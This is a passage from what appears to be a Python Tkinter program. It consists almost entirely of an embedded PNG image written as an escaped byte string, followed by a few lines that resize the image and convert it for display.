\x11\x88\x11"\x92\xd0\xf6\xcel\x0b\x92\x98\x1b"\xc4\x18\x02\t\xf1A\xc2\x1b\x82\xfe\xd1`K\xdb{\xe6\xeeB\xb0P@B\x1b\x1a\x10\xeb;E-Z\xb1R\xa0P\x02\xb4\xdd\xd5\x05\t\x14\xdb\xee\xa3\xfb83\xbf\xef7\xf9\xfc_f\x86\x9c\xd3\xdd\xed^\x80\x1f\x02\x94\xca\xe2s^\x0f\x16\xbe\x87?K@\x9e\x18\xfe\x00\xff\x0c\xf0\xd5*\x0b\xff\xf6z\xb0\xf0?\xfcY\x02\xf2\xc2\xf0\x07\xf8E@o^\x00\xfe\xee\xf5`\x91\xc7\xf0g\t\xc8\x03\xc3\x1f\xe0W\x01\xef\x94ZX\xef\xf6`\x91\xcd\xf0g\t\xf0mh\xf8?\xfe\xec\xdf\x06s\x88\xe1\x8f\x9cd\xfda@\x95\x85u^\x0f\x16y\r\x7f\x96\x00\x9f\x18\xfe\x00\x1f\x07\xbc\xcb4\xc55>\x0f\x159\x0e\x7f\x96\x00\x86\xffX\xbb\xed\x89U\x0c\x7fdG-\xac\x96\\\xab,\xac\xf2z\xb0\xc8s\xf8\xb3\x040\xfc\x19\xfe\xa8\x0b\xb5x\xaf\xe4\x9aZ\xec\xf3z\xb0\xc8w\xf8\xb3\x040\xfc\x19\xfe\xa8\x89\x8e\xe4\x9a\xa6x\x87\xd3CE\xe6\xc3\x9f%\x80\xe1\xcf\xf0G\xf1,.\x96\\S\x8b7\xba=Xd?\xfcY\x02\x18\xfe\x0c\x7f\x94-\\\'\xb9V\xa5x\x95\xcfCE)\xc3\x9f%\x80\xe1\xcf\xf0G\xa9\xd4\xe2\x95\x92k\x9aB\xcb\xeb\xc1\xa2\x9c\xe1\xcf\x12\xc0\xf0g\xf8\xa3Dj\xe1{\x92kj1z=X\x945\xfcY\x02\x18\xfe\xff\x1d\xfen\xcf\x11\x18\x9b\xde\x05\x92kj\xbd\xe7\xfb<T\x948\xfcY\x02\x18\xfe@a\xbe%\xb9\xd6m\xe1\xabN\x0f\x15\x85\x0e\x7f\x96\x00\x86?P\x90/I\xaeU\xd6{\x82\xd3CE\xc1\xc3\x9f%\x80\xe1\x0f\x94\xa0+5\x8f\x97\\\xeb\xb20\xd3\xeb\xc1\xa2\xec\xe1\xcf\x12\xc0\xf0\x07\xf2\xd7{\x84\xe4Z\xd7\xdd\x97\xbc\xcf\xe7\xa1b\xbc,\xd9\xf0\xf0\xa0\xf7\xb6\rl\x1fl\xae\xbd\xd5\xed\x192\xfc\x19\xfe\xc0\xaeh_s\x86\xe4\xda\x9c\x95\xad\xe9\x95\xc5\x01\xaf\x87\x8b\xbdw\xda\xfdW\rn~\xf9\x85A\xef\xf1\x95\x00\x86?\x90\x97\xb0c\xee\xe2\xb9\xfbJ\xceU)n\xf2y\xb8`\t\x00\xc3\x1f\xf0*l\x94\xdcS\x0b\x8f\xf9<\\\xb0\x04\x80\xe1\x0f8eq\xad\xe4\x1e\x9f\x08X\x1f,\x01ya\xf8\x03~\xa9\x85\xb6\xe4^\x95\xc2M^\x0f\x18,\x01^\xcfq2\x86\xffo\x18\xfe\x80[j\xe1\x06\xc9=\xb5x\xb9\xd7\x03\x06K@\x1d\x97\x00\x86?\x90\x01\x0b\x97I\xeeU\x16\xces{\xc0`\t\xa8\xd9\x12\x90\xd3\xf0\xbf\xf5\x89\xfb\xdc\x9e#0\xd14\xc5s%\xf7\xaav\xf3$\xaf\x07\x0c\x96\x80:-\x01\x0c\x7f \x1f\x9a\xc2\x89\x92{\xba\xfc\xe2\xc3\xbc\x1e0X\x02\xea\xb2\x040\xfc\x81\xbctu\x16|P\xb2\xaf\xd5\xda\xa7\xb2\xf8\x92\xd7C\x06K@\xe9K\x00\xc3\x1f\xc8\x8b\xa6\xb0U\x06e\x9a\x94\x90Z\xfc\x9d\xd7\x83\x06K@\xc9K\x00\xc3\x1f\xc8\x8f\xa6\xf8k)%\xb5\xd0\xf6z\xd0`\t(u\t`\xf8\x03yR\x0bK\xa4\x94\xd4\xc25^\x0f\x1a,\x01%.\x01\x0c\x7f _j\xf1J)\xa5F\'\xce\xf3z\xd0`\t(m\t`\xf8\x03ykX\xbc@J\xa9\xd1\x89\xa7z=h\xb0\x04\x94\xb4\x040\xfc\x81\xfc5,\x9c,\xa5\xd4\xe8\x0b]^\x0f\x1a,\x01\xa5,\x01\x0c\x7f\xa0\x0c=\xfd\xf1#RJG\xa6\x8b\xde\xae\x16\xb6y=l\xb0\x04\xe4\xbe\x04|\x82\xe1\x0f\x94\xc1\xe2KsV\xb6\xa6KIU\x16\xd6\xb9=p\xb0\x04d\xbc\x040\xfc\x81\x82XxDJ\xabJ\xe1gn\x0f\x1c,\x01\xa3X\x02\x16=z;\xc3\x7f\x0c\xdd\xb2\xfe^\xb7\xef\x0f\xf0B-\xde(\xa5UYX\xe4\xf5\xc0\xc1\x12\x90\xe3\x12\xc0\xf0\x07\xca\xd3\xe8\xc4yRZU\'|\xde\xeb\x81\x83% \xb7%\x80\xe1\x0f\x94\xa9\x91\x9as\xa4\xb4z\xfa\xe3\x81^\x0f\x1c,\x019-\x01\x0c\x7f\xa0P\x16\x07f\xb5/y\xaf\x94\x98\xa6\xf8O\xb7\x07\x0f\x96\x80\x0c\x96\x00\x86?P\xb2\xf0\x17)5\xb5\xd8\xe7\xf3\xd0\xc1\x12\xe0\x7f\t\x18\x1a\xfe\xeb\x9e\xdd0\x98C\x0c\x7f`,\xc2\x9dRj\x9a\xe2\x0f}\x1e:\xbcb\t`\xf8\x03\xb5a\xe12)5\xb5\xde\xb3\xdc\x1e<\xdc\xaa\xfb\x12\xc0\xf0\x07j\xa2\x13O\x93R\xd3\x14\xd5\xed\xc1\xc3\xb5\xba.\x01\x0c\x7f\xa0Nz\x8f\x90R\x9b\xbbx\xee\xbeU\n[|\x1e<\xbc\xab\xdb\x12\xc0\xf0\x07j\xc4\xe2\xd32(\xd3\xa4\xe44\xc5\xbb\xdc^\x00\xdc\xab\xcb\x12\xc0\xf0\x07j\xc6\xe22)=M\xa1\xe5\xf6\x02\x90\x85\xd2\x97\x00\x86?PC\x16\x16I\xe9u\xa7\xf0Y\xb7\x17\x80l\x94\xba\x040\xfc\x81\x9aj\x87OJ\xe9\xf5\xf4\xc7\xfd\xd5\xe2+n/\x01\xd9(m\t\xc8i\xf8\xdf\xcc\xf0\x07\xc6\x8f\xc5\x97\x86>6_\xea\x90ZX\xed\xf6"\x90\x95R\x96\x00\x86?Pg\xe1>\xa9K\x95\x85\xab}^\x02r\x94\xfb\x12\xc0\xf0\x07\xeaMS\xbcB\xeaRe\xcd\xd3\xbd^\x04\xf2\x94\xeb\x12\xc0\xf0\x07\xd0\x9d\x9a\xa7H]j,\x9bw\x90\xd7\x8b@\xber[\x02\x18\xfe\x00\xaa\x14vh_s\x86\xd4\xa9\xca\xe2\x9f|^\x06r\x96\xd3\x12\xf0\xe4\xd6\xa7\x07s\x88\xe1\x0fL\x1c\xb5\xf0\x98\xd4\xad*\x85\x9b\xbc^\x08\xf2\x96\xcb\x12\x90C\x0c\x7f`b\xa9\x85\x9fH\xdd\xd2N\xf8\xba\xd7\x0bA\xfeX\x02\x18\xfe@\x0e\xba\xdb\xbd_\x91\xba5\xf4=\x0fMq\xbb\xd7KA\xfeX\x02\x18\xfe\x80o\xe1\xe5\xa3\xee\\\xf8n\xa9c\x95\xc5\x87|^\nJ\xc1\x12\xc0\xf0\x07\xfc\n\xf7H]\xe3s\x01\xc0\x120\xd2\x18\xfe@q:q\xa1\xd45\xedk\x1e\xe7\xf6bP\x14\x96\x00\x86?\xe0\xcd,k\xce\x92\xda\xd6j\xed\xa3\x16\x9e\xf2z9(\x0bK\xc0\x9e\x86\xffJ\xb7\xf7\x06\x94H-l\x90A\x99&u\xae\xb2x\xbb\xd7\x0bByX\x02\x18\xfe\x80\x07\x9a\xe2\xf5R\xf7\x1a\xa9\xf9\r\xaf\x17\x842\xb1\x040\xfc\x81)g\xcd\xd3\xa5\xee\xcd\\\x1e\xde_\xa5\xb0\xc3\xed%\xa1H,\x01\x0c\x7f`\xaa\xa8\x85m\xb3\x97\xce?@\x88\x8f\x07\x06K\xc0\x1b1\xfc\x81\xe2YX%\xf4Z\x95\x85K\xdd^\x14\x8aV\xc7%\x80\xe1\x0fL-M\xb1)\xf4Z\xb3\xda\x0b>\xea\xf5\xa2P\xbe:-\x01\x0c\x7f`\x8aY\x1c\xd0\xe5\x17\x1f&\xf4F\x95\xc5\xb5n/\x0c\xc5\xab\xc3\x12\xc0\xf0\x07\xa6\x9e\xa6\xf8\xa0\xd0\xce\xa9\xc5\xefz\xbd0\xd4C\xc9K\x00\xc3\x1f\xf0\xa2w\x81\x10\xdf\x06\x00K\x00\xc3\x1f\xa8\x11\xbe\xfc\xcf\xb7\x01\xe0[IK\x00\xc3\x1f\xf0CSx@\x88o\x03\xc0\xb7\x12\x96\x00\x86?\xe0\x8c\x85\xf9B|\x1b\x00\xfe\xe5\xbc\x04\xdc\xc4\xf0\x07\x9c\t;f\xafh\x1e"\xb4\xfb*\x0b\x8f\xf8\xbc<\xd4Q\x8eK\xc0u\x7f\xbe\xc7\xedy\x02\xb5e\xf1~\xa1=\xa7)\\\xe2\xf6\x02QKCK\xc03\xafl\x1d\xcc\xa1%\x1bV\xbb=G\xa0\xce\x1a\x9d8Oh\xcf\xcdJ\x8b\x0e\xd5\x14\xb7{\xbdD\xd4S\x0e_\tX\xbb\xf9\t\xb7\xe7\x07\xd4\x99Z\xd8\xa6\xed\xde\x83\x85\x86O-\xf4{\xbdH\xd4\x97\xe7%\x80\xe1\x0f\xf8\xa5\x16\x96\x08\x8d\xac\xeev<\xc3\xebE\xa2\xdeF\xb7\x040\xfc\x01\xbc\xfa\xe5\xffS\x85F\x96.n\xbd\xadJq\x93\xd7\xcbD\xbd\x8dl\t`\xf8\x03\x18\x126\xceY\xd9\x9a.4\xf2\xd4\xc25>/\x13\x18n\t`\xf8\x03x\x8d\xa6x\x85\xd0\xe8\x9ae\xcdY^/\x14\xd8\xfd\x12\xc0\xf0\x07\xf0\xa6_\xfd\xdb\xd7<Rh\xf4i\x8ak\xdc^,\xf0\x7fK\x00\xc3\x1f\xc0\x1b\xd4\xe2\xbdBc\xaba\xf1\x02\xaf\x17\x0b\xbce\t`\xf8\x03\xd8Y;\x9e-4\xb6\x8e\xb9\xfb\xe2\xf7h\n[\xdd^.\xb0\xf3\x12\xc0\xf0\x07\xf0*\xb5\xf0\xec1\xcb[\xfb\t\x8d=M\xe16\xaf\x17\x0c\xecb\t`\xf8\x03\x18\xd4\x14\xae\x15\xda\xbb\x1a\xb6\xe0X\xaf\x17\x0cL\xc6\x12\xb0v\xf3z\xb7\xff\xbd\x00v\xad\x91z{\x84\xf6>\xb5\xf0+\xaf\x97\x0c\xecf\t`\xf8\x035\xa5)\xde%\xc4o\x06D=\xfdo\t`\xf8\x035\xd4\x9d\x9a\xa7\x08\x8dOs\x17\xcf\xddW-\xac\xf7z\xd9\xc0\x1e\x96\x00\x86?P/\x7f\x90Vk\x1f\xa1\xf1\xab\xea\xc4\x85N/\x1b\x18n\t`\xf8\x03\xb5\x11\xbe#4\xbe\xcd^:\xff\x80\xca\xe2\xf3>/\x1c\x18v\t`\xf8\x03\x85\xd3\x146\xf7\xf4\xc7\xfd\x85\xc6\xbf*\x85\x1fy\xbdx`\x04K\x00\xc3\x1f(\x99\xc5\x1f\x08ML\xdd+\x16~\xacJa\x87\xdb\xcb\x07\x86_\x02\x18\xfe@\x81\xd4\xc2\xb6\xaa/|Xh\xe2R\x0b\xcb\xbd>\x00`\x84K\x00\xc3\x1f(\x8d\xc5\x9f\x0bMlU\'~\xda\xed\x03\x00F\xb9\x04<\xb4\xe9\x8fn\xff\x9c\x00FN\xfb\x9a\xc7\tM|\x95\x85U^\x1f\x010\xd2%\xe0\xaa\xdf\xb7\xdd\xfe\xf9\x00\x8cJGhrjX8\xd9\xe9#\x00\x00\xd4\x8c\xa6p\xa2\xd0\xe4UY\xbc\xdf\xebc\x00\x00\xd4\x84\x85\xbb\x85&7m7\xbf\xe0\xf6A\x00\x00j\xa1\xbb\x1d?%4\xf9U\x16\x1f\xf6\xfa(\x00\x00e\xd3\x14\x7f)455:\xf1T\xaf\x0f\x03\x00P\xb8v\xf3$\xa1\xa9K-\xacv\xfb8\x00\x00E\xd2\x14\x1f\x14\x9a\xda\xb4\x13\xbe\xec\xf5\x81\x00\x00\xca\xd4\xdd\xe9\xfd\x9c\xd0\x147(\xd3*\x0b\x8fx}$\x00\x80\xb2\xf0\xb7\xff\x11\xc7\xbf\x08\x00\x00\x94C-~F\xc8Oj\xa1\xdf\xebc\x01\x00\x14c\xa9\x90\xaf\x1a\xa9\xb7GS\xdc\xee\xf4\xc1\x00\x002\xa7\x16\xb6i\x8a*\xe4\xaf\xca\xe2\xcd^\x1f\x0e\x00 {?\x16\xf2\xd9\xec\x15\xcdC4\x85\xadN\x1f\x0e\x00 [aKc\xd9\xbc\x83\x84\xfc\xa6\x16/\xf7\xf9x\x00\x00\xd9\xb2p\xa9\x90\xeft\xe5\x85\xef\xaaR\xd8\xe8\xf6\x11\x01\x00\xb2\xa2)>y\xcc\xf2\xd6~B\xfe\xabR\xbc\xd0\xebC\x02\x00\xe4ES<W(\x8f\xe6\xaclM\xaf,\xac\xf3\xfa\x98\x00\x00yP\x8b\x8fJ\xab\xb5\x8fP>u[\xfc\xa2\xd7\x07\x05\x00\xc8\x80\xc5\x81Fj\xce\x11\xca/M\xf1\x0e\xb7\x0f\x0b\x00\xe0\x9b\x85[\x84\xf2lVZthe\xf1y\xb7\x8f\x0b\x00\xe0\x92\xa6\xb0\xb9\xa7?\x1e(\x94oj1z}`\x00\x00\x9f\xb4\xd3\xfc\xb6P\xde\r\xfd@\xa0Z|\xd4\xeb#\x03\x00\xf8\xa2)\xae\xe1\x07\xff\n\xa9\xb2\xde\x13*\x8b\x03^\x1f\x1b\x00\xc0\xcd\xf0\xdf\xde\xd5Yx\xb4P9\xa9\xc5\x1b\xbd>8\x00\x80\x0fj\xe1\x1a\xa1\xb2\xd2\xbe\xe6\x0c\xb5\xf8/\xaf\x8f\x0e\x000\xd5\xc2\xc6\xd9K\xe7\x1f T^\x95\x85\xf3|>:\x00\x80\x03g\n\x15\xda\xa0LS\x8b}N\x1f\x1e\x00`\x8ah\x8a+\x84\xca\xae\xbb\x1d\x0f\xaf,>\xe7\xf5\x11\x02\x00&}\xf8?3\xf4q\xf2B\xe5\xa7\xd6{\xbe\xd7\x87\x08\x00\xe0K\xff4\x81U)$\xa7\x0f\x11\x000i\xc2\x9dB\xf5\xea\xa8\xbb\x16~HS\xd8\xec\xf3A\x02\x00&\xc1\xa6\xc6\xb2y\x07\t\xd5\xaf\xca\x9a\xe78}\x94\x00\x80\t\xa6)~M\xa8\xbe\xa9\x85_x}\x9c\x00\x80\tb\xf1v\xa1z\xf7\xf1t\xd1\x07\xd4\xc2Sn\x1f)\x00`|Y\xfc\x87\xf65g\x08Qw;\x9e\xe1\xf6\xa1\x02\x00\xc6\x8f\xc5\x81\xee\xd4<E\x88^OS\xbc\xde\xed\x83\x05\x00\x8c\x0f\x0bW\x0b\xd1\x9b;|e\xeb\x1d|l0\x00\x94KS\\\xa3\x8b[o\x13\xa2\xb7\xd6eaf\x95\xc2\x16\xaf\x8f\x17\x000VaK\x97\x85\x99B\xb4\xbb\xd4\xe27}>^\x00\xc0X\xa9\xf5\x9e%D\xc3\xa5)\xde\xea\xf5\x11\x03\x00FGS\xb8V\x88FRO\x7f\xdc_S\xfc\xad\xd7\xc7\x0c\x00\x18\xa9\xf0\xf8\xf1\x8b\x9b\xef\x14\xa2\x91\xd6\xb5"64\xc5\x17}>h\x00\xc0p\xd4\xc2\x0bU{~\xb7\x10\x8d\xb6\x86\xc5\x0b\xbc>l\x00\xc00\xacy\x8e\x10\x8d5\xb5p\x83\xdb\xc7\r\x00\xd8%\xb5\xf8S!\xda\xdb\xdf\x0fPY|\xc8\xeb#\x07\x00\xecLSx\x80\x7f\xefO\xe3\x92\xb6{\x0fV\x0b\x1b\xbc>v\x00\xc0\xeb\xc2_{\xfa\xe3\x81B4^uu\x16\x1e\xcd\x0f\x05\x02\x80_\x9a\xe2\x8b\r[p\xac\x10\x8dwU;\x9e\xed\xf5\xe1\x03@\xadY\x1c\xa8R<S\x88&\xaa\xca\xc2\xd5n\xff\x07\x00\x80\x9aR\x0b\xdf\x17\xa2\xff\xb0ww?r\x97U\x00\xc7\x1f\xda*B4\xbcH\xc5\x17\x14\xb4\x95\xdd=\xcfl\xdbdI\xd3DM\x831j\x82\x8dz1W&F\xbd\xd8\x0b\xc32\x9d\xe7\xcc\xb2\x8d7\xc3\x85\x17\x1a\xaf\x8c\x89\xdah\xbc\xe0B\xe3\xdc\x94\xee\xce9\xb3e\x89k\xa2M44\xc1\xa2XcS@CP\x83\xefR!\x14Zv(\tKHa\xe9\xee\xcc\x9e\x99\xf9~\x93\xcf\x9fp\xce\xee\xcc\xfc~\xcf\xd3\xcb\xaa\xad\xea\xd6\xec\xc5\xa3\x0e\x01\x00\x8c\xa0Nw7\'\xa2^7\xd9>t]6=\x1dt\x10\x00`d\x88\xe9\xa9\xa9\xa5\xb9k\x12Q\xbf\xaa,\x96\xf1l\xe5\xefQ\x87\x02\x00\x86\x9d\xb8\xfeu\xb2}\xf0C\x89\xa8\xdf\xc9b}\xafXy:\xeap\x00\xc0\xb0\x12/g\xc7\xbd\xbe/\x11mV\xd9\xcag\xc4\xca\xb9\xa8C\x02\x00\xc3FL\x9f\x93v\xfd\xd3\x89h\xb3\x13\xd7\xe9\xa8\x83\x02\x00C\xc5\xf4\xbc\x98~9\x11EIL\xbf\x1ev`\x00`XX\xf9Z"\n\xd5\x85tE\xf6\xf2\xa3\xb0C\x03\x00\x83\xce\xf4p"\x8a\xd8\xd4\x89\xe9\xb7d\xd7N\xd8\xe1\x01\x80\x01%\xae\x0b\xfb\x97\x9b\xdb\x12Q\xd4d\xf9\xabo\x17\xd7\x13Q\x87\x08\x00\x06\x8d\xb8\x1e\xdf\xd7\xaa_\x95\x88\xa2w\xeb|\xb9A\\\x1f\x8e:L\x0008\xcaC\xb2X\xbf>\x11\rJ{|f{\xb6\xf2H\xcc\x81\x02\x80\xf8\xc4\xca\xc9\xf1\xa5C\xefLD\x83V\xe5\xe8]7\x8a\xe9\xa9\xa8\xc3\x05\x00Q\x89\x95?H\xbb\xf1\xeeD4\xa8M\xfa\xdd7\x89\xeb\x99\xa8C\x06\x00\xf1\x94?\x8e\xdd?\xfb\xdeD4\xe8\xc9\xfc\xdc\x07\xb2\xe9c1\x07\r\x00")\x8fO\xb4\xf5\xe6D4,\xc9b}\xa7\xb8>\x11s\xe0\x00`\xf3\x89\xe9\x9fw\x1d\xd3\x0f&\xa2akba\xf6\xc3\xd9\xf4\xc9\xa8\xc3\x07\x00\x9b\xe5\xe2\x07\xa4\xc6\x8eD4\xac\x89\xab\xf0O\x00\x00\xacV\xfe\xd4\xfd\x80\x94\x88\x86\xbd\xb1N\xed\x96lz:\xe6 \x02@\xff\x88\x95G\xb9\xd3\x9fF\xaa\xee\xeb-\x1c\x16\x04`\xa4Yy\x84\xa7\xfdi$\x9bl\x1f\xba.{\xf9U\xd8\xe1\x04\x80\x1e\x11\xd7\x079\xe4\x87F\xba\xee\xdd\x01\xd9\xf4\x81\xa8C\n\x00\x1bML\x7f>v\xdf\xec;\x12\xd1\xa8\xb7\xd3g\xae\xcc\xaeG\xa2\x0e+\x00l\xe4\xad~\\\xecC\xb4*i5\xdf*^~\x1auh\x01`\xddL\x7f\xdc\xbd6=\x11\xd1\xab\xab\xb6\xaa[\xc5\xcb\xf7\xc2\x0e/\x00\\\xb6\xf2\x9d\xd4lnIDt\xe9\xb2\x95Z\xf6\xf2B\xcc!\x06\x80\xb5\x13\xd7\xe7W\xcc%"Z[\x15o|^\xbc\x9c\x8d:\xd4\x00\xf0F\xc4\xca\xd3\x13\xed\xc6g\x13\x11\xbd\xe9\xfb\x03\xf6f/\x7f\x89:\xdc\x00pI\xa6OV\xec\xe0m\x89\x88.\xaf\xdd\x0b\xf5\xf7e/\x0f\x85\x1dr\x00x\x8d\xf2\xdb\xee-\xa8\x89\x88\xd6W\xf7}\xd9lj1\x07\x1d\x00^!\xae\xf7O-\xcd]\x93\x88hc\xda\xbf\xdc\xdc&\xa6\xdf\x8d:\xf4\x00 \xae?\xe05?\xa2\x1e%\xaeu\xb1r.\xea\x02\x000z\xc4\xf4\xb9\x15w&"\xeam\x13\x9d\xd9\x8fq\xa50\x80\x08\xc4\xca\xdfr\xbb~{"\xa2\xfe\xd4\xbdAK\\\x8fG]\n\x00F\x80\xe9/\xc6;\x07\xdf\x93\x88\xa8\xbfu\x9f\x0b\xc8V\xbe\x11v9\x00\x18^\xa6\x87\xbbG\x98\'"\xda\xbc\xc4\xcb\x1784\x08@_XyF:\xe5K\x89\x88b$\xed\xc6\x1eq=\x13vi\x00\x18|\xa6\xa7+\xde\xd8\x95\x88(V\xb2X\xbf\x9e\xf3\x02\x00\xf4\x84\xe9\xd1\xddGj\xd7&"\n\xda\x85t\x85\xb8N\xf3\x93\x00\x80\x8d\xfa\xca\x7fE\xad\xbb[\x12\x11\xc5O\\EL\x7f\x13v\xa9\x00\x88\xcf\xf4w|\xe5O4\x80\xdd\xbc\xdc|\x9bX\xf9v6=\x1fv\xc1\x00\x88\xc7\xf4\xfc\x8a\xc3S\xf3\xcd\xab\x13\x11\rn\xd9\x1b\x9f\xe4\xe0 \x00k=\xd8\xa7\xd2\xd1;\x12\x11\rG\xbb\x8e\xe9\xbb\xc4J;\xea\xd2\x01\xb0\xf9\xc4\xca1\x0e\xf6!\x1a\xc6.> X\xcfV\x9e\x89\xba\x80\x00\xf4\x9fx9+\xa6w\xf2\xa0\x1f\xd1\x90\x97\xbd\xb1C\\\x7f\x16u\x19\x01\xe8\xefq\xbe\x93\x9d\xd9\xb1DD#\xd2\xcb\xaf\x0bf/\xff\r\xbb\x98\x00\xf4\x8e\xe9\x7f\xb2\x95Zj6\xb7$"\x1a\xbd\xba\x97\ne/\xf7\x85]R\x006\x9e\xa9\xe5\xc5\xf2\xfeDD$\x9dR\xcd\xaeO\x85]X\x00\xd6M\xbc\xfcS\\\xa7\x13\x11\xd1\xea*G\xef\xbaQ\xbc\xdc\x1buy\x01X\x07\xd3\xd6\x1e\x9f\xd9\x9e\x88\x88.\xd5\x84\x95\xcfe/\x8f\x87]d\x00\xd6L\xac<\x9a]\x0f$"\xa2\xb5\xb4\xafU\xbfJ\\\xe7\xb2\xe9\xff\xa2.6\x00\xaf\xffj_6\xbd\xa7{"h""z\xb3M\xfa\xdd7\xf1\xb3\x000X\xc4ua\xacS\xbb%\x11\x11\xad\xb7\xdc\xae\xdf.\xae\x0fG]x\x00\xf4\x82\x98\x9e\xca\x9d\xf2\xa9DD\xb4\x91\xed_nn\xcbVjb\xe5\xdfQ\x17 0\x8a\xc4\xf5_\xdd\xd9\xec\xceh""\xea\xe9\xdb\x02V~(\xae\xcfG]\x88\xc0(\x10+\xe7\xb2\xe9\xf7o\x9d/7$"\xa2~UY,\xe3\xd9\xb4\xc5u\xc3@\x9f\x99\x9e\x17\xd7\x85I\xabO&"\xa2\xcdJ\x16\xeb{\xb3\xe9\x03a\x97%0L\xac,U\xec\xe0m\x89\x88(J\x13\x9d\xc6\'\xc4\xf5\xc1\xb0\x8b\x13\x18d\xa6\xbf\x16\xd3\x8f\'"\xa2\xa8\xbd\xf4\x8f\x80\x95\x93a\x17)0@\xc4\xf5\xf7\xd2)U\xae\xea%\xa2\x81\xa8\xda\xaan\xadx\xf9\x8a\xb8\x9e\x89\xbaX\x81\xd0LOg\xab\x7f\xb1;K\x89\x88h\xe0j6\xb7d\xd7\x03\xfc4\x00\xac\x8dX9\xd9\xfd\xc3\xcf+}D44]|F\xa0\xfc2\xea\xe2\x056\xd3\xcb\xb3q\x80\xaf\xfa\x89hh\x13/\x1f\x15\xd7\x05^\x1f\x04VXY\xca\xd6\xf8H""\x1a\x95*\xde\xd8%^\xee\x15+\xe7\xc2.g\xa0\'\xca\x0b\xe2\xba\xc0\xeb|D4\xd2eo\xec\x10\xd3oe\xd3\x7f\xc4\\\xd6\xc0\x86yJ\\\xbf\xc9E=DD\xab\xda\xe93WJ\xa7T\xc5\xf5x\xd0\xe5\r\\\x16q=\xb1bzj\xbeyu""\xa2K7\xd9\xd6\xa9lzX\\\xff\x1fu\xa9\x03\xaf\xcb\xf4\xd9\x15-~\xdf\'"\xba\x8cv\x1f\xa9]\x9b\xad\xd4\xb2\xe9ca\x17=\xb0\x8a\xb8>\x91M\xef\xd9\xe33\xdb\x13\x11\x11m\xc0\xc1B\x1d\xbdC\xac\xfc\x84o\x05\x10\x8dx9\x9b_l\xef\x8eA\xe4*\xe20\x80?\x1bA\x10E\x1bA\xd4B\x90x3w\x85\xd8X\x88\xb5\x8d`/6\x16\x87(x\xb9\x19\xcf\xb3s\xab\x90\xd2X\x99V\xb09\x111\xb73\t.bs\xe5\x81\x16F\xab\x13\x1b\xa3\x95\x85h\x11I\xd0\xfd\xe3b\x13\x12\x08\xe1\x92\xb7{\xbf\x1f|p\x1c\xdc{S\x1c|\xb3\xf3\xe6\xcd\xf6\xf2i\x9an\xbf\x1cg_\x0c\x00\x1c\xcb^\x81\x87\xe2\xa0\x94\xdc\xca,\xf7r}\xac\xa5 \xab\x9er=\xf5r\x90z\xdd\x8c\xff\xc9\x01\x80\xbbg\xa3\xbf\xf7Dne+\xb5\xfa\xdd8KBV-\xa9\xd7\x1fr\xab\x93\x8d\xe9\xe9\xa7\x07\x00\xee\xbd\xc5\xd7\x12\x7f\x94z\xfdm\xac\xe5!K\x9aV\xaf\xa4^?\x8c\xcd\xa9\x03\x00#5\x7f\x06\xbbx\x8b`\x92Z\xfdq\xb4\xa5"\xa3Nj\xe5\xa7y\xce\xc5\x11\xd6\xce\xe5\x07XB\xb1T\x9b[\xd9J\xbd\x1c8~Xn\x99V.\xe7V\'>\xe9\x03\xac\x98ta\xf7\xa9\xd4\xeb\xe6<\xfb\xa9\xd5\xbfG[DrW\x92z\xbd\xf6\xdf\xc4\xb0l\xc5~\x92\x01\x80\xd5\x97\xbey\xeb\xc1X\xde\xcd\xad\x9cM\xbd\x1eZ\x1d8\x19I\xbd\x1e\xe5V\xcf\xc7\xa9\x93q\xce\xc4\x00\xc0\xc9\xb6\xfe\xe5;\x8fE)D9\xe4^~\x1ek\x81\xc9\xed\xa6\xfc\x9a[\xddK\xbdn\xe6K\xe5\xc9\x01\x00ne\xe3\xe2\xce\xa9\xd4\xca\xdb\xf3|\x1e%2\xcer\x93\x1b\xd2\xca/\xf3|\xb6\xde\xea\x9bk\xfb;\xcf\x0c\x00p\'N}\xb5\xf3x\xee\xf5\x95\xdc\xea$\xb72K\xbd\xfc5\xda\x12<!I\xad\xfc\x99z9H\xad\x9c\x8b\xc3\xa1\xd6.\x9e\xce\x03\x00\x1c\xf7\xf1\xc4Q8Q<Q@\xa9\xd7C\'\x13\x1e\xff\xf3\xfb\xd4\xcb\'\x8b\xb7:^L{\x1f\xdc?\x00\xc0\xbd\x16\x85\x14\x93\x82\xc5^\x82\xc9<{\xb9\x95\xcb\xa9\xd7kc-\xd5Q\xa6\xd5+\xb9\x95\xd9bb\xb5\x19e\x1f\x9b6\x07\x00X&\xf1=\xf0\xf1ny\x9e\xd6\xd7s+gS+\x17bb\x10K\xd8\xa3-\xe1cO\xf9#\xb7\xfa}\xee\xf5\x8b\xdc\xcb\x99\xd4\xcbkk\xbd<\xf7\xc2\xde\xf6\x03\x03\x00\xac\xba(\xbc8\xac(^IL\xbdn\xc6\x04a\xb1\xcc=K\xbd\x1e-\xeb\xeaA\xea\xe5\xf7\xd4\xeb\xe1<\xfb\xb9\xd5\xf3\xa9\xd7\xddX\x19\x89\x89P\xec\xa7\x18\xfe\x19\xee\x1b\x00\x80\x9b?V\x88\xc2|v\xbf\xae\xafM\xebKk\xad\xbc\xba\xde\xcb\x1b\xb9\x97w\xe79\x13\xe5\x1a\xbb\xdes/_\xcf\xf3m\xea\xf5(\x12\xbb\xe1\xa3\x84#\xb9\x97\xab\xb7\xf1\xc9\xfc\xea\xff\x7f\x17\xd7X\\/\xae\x9d\xe3\x1eq\xafV?\x8e{\xc7\x18b,1\xa6\x18[\x8c1\xc6\xea\xd9<\x00\x8c\xcc\xf3\xb3\xdd\x877\xa6\xef?\x92.m?\x1a\x89\x9f\xe3w\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x85\x7f\x01t\xff\xda\xc9\xbe\xb3)\x93\x00\x00\x00\x00IEND\xaeB`\x82'))
        resized_image = image.resize(size)
        photo = ImageTk.PhotoImage(resized_image)
    else:
